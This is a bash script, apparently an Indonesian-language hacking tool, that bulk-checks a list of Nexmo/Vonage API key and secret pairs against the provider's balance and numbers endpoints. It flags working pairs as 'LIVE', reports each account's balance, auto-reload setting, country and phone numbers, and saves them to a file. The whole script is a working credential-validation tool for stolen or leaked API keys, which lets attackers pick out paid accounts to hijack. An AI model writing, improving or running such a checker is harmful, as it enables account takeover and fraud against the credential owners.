#!/bin/bash
banner()
{
  printf " %-40s \n" "`python3 logo.py`"
}
banner


merah='\e[91m'
cyan='\e[96m'
kuning='\e[93m'
oren='\033[0;33m' 
margenta='\e[95m'
biru='\e[94m'
ijo="\e[92m"
putih="\e[97m"
normal='\033[0m'
bold='\e[1m'
labelmerah='\e[41m'
labelijo='\e[42m'
labelkuning='\e[43m'
labelpp='\e[45m'
# RATIO


res1=$(date +%s)
register(){
    res1=$(date +%s)
    empas="${1}/${2}"
    stats="[$(date +"%T")]"
	rand1=$(echo $((RANDOM%9999)))
	curl=$(curl -s "https://rest.nexmo.com/account/get-balance?api_key=$1&api_secret=$2" \
	-H "User-Agent: okhttp/3.12.0")
	autoRe=$(echo "$curl" | grep -Po '(?<="autoReload":)[^}]*')
	saldo=$(echo "$curl" | grep -Po '(?<="value":)[^,]*')
	if [[ $curl == *"Too Many Requests"* ]]; then
	echo -e "[+] $1|$2 - ${biru}Got Blocked${putih}\n"
	elif [[ -z "$saldo" ]]; then
	echo -e "[+] $1|$2 - ${merah}DIE${putih}\n"
	else
	getPage=$(curl -s "https://rest.nexmo.com/account/numbers?api_key=$1&api_secret=$2" \
	-H "User-Agent: okhttp/3.12.0")
	number=$(echo "$getPage" | grep -Po '(?<="msisdn":")[^"]*') 
	country=$(echo "$getPage" | grep -Po '(?<="country":")[^"]*')
	echo -e "LIVE $1|$2"
	echo -e "Balance: ${ijo}$saldo${putih}\nAutoReload: $autoRe\nCountry : $country\nNumber : $number\n\n" 
	echo "$1 | $2 | Balance: $saldo | AutoReload: $autoRe | Country : $country | Number : $number" >> nexmolive.txt
	fi
}
printf "${white}[+] Input MAILPASS List : "; read LIST 
if [[ ! -f $LIST ]]; then
    echo "[-] File $LIST Not Exist" 
    exit 1
fi

totallines=$(wc -l < ${LIST});
itung=1
index=$((pp++))
printf " '-> Total MAILPASS On List :${white} ${bgreen} $(grep "" -c $LIST) ${cbg}\n" | lolcat --force
printf "${white}[+] Threads          : "; read THREADS
printf "${white} '-> Set Threads To ${bgreen} $THREADS ${cbg}\n" | lolcat --force
pp=1
IFS=$'\r\n' GLOBIGNORE='*' command eval 'mailist=($(cat $LIST))'
for (( i = 0; i < ${#mailist[@]}; i++ )); do
   pp=1
  index=$((itung++))
    username="${mailist[$i]}"
    IFS=':' read -r -a array <<< "$username"
    email=${array[0]}
    password=${array[1]}
   tt=$(expr $pp % $THREADS)
   if [[ $tt == 0 && $pp > 0 ]]; then
   sleep 0
   fi
   let pp++
   jam=$(date '+%H')
   menit=$(date '+%M')
   detik=$(date '+%S')
   

	register "${email}" "${password}" "${index}" 
	
	
done





termin=$(date +%s)
difftimelps=$(($termin-$res1))
echo -e "Finished at ${ijo}$(($difftimelps / 60)) menit dan ${ijo}$(($difftimelps % 60)) detik"


